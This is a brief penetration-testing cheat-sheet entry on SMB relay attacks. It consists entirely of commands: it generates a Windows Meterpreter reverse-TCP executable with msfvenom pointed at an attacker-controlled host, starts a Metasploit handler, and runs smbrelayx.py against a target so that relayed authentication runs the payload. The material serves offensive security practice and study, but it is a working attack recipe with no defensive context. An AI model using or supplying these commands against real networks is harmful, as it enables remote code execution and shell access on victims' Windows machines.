# SMB Relay
```bash
# First, create a payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LPORT=<Port #> -f exe -o smbexp.exe

# Second, launch exploit/multi/handler in Metasploit

./smbrelayx.py -h <Target Host> -e smbexp.exe
```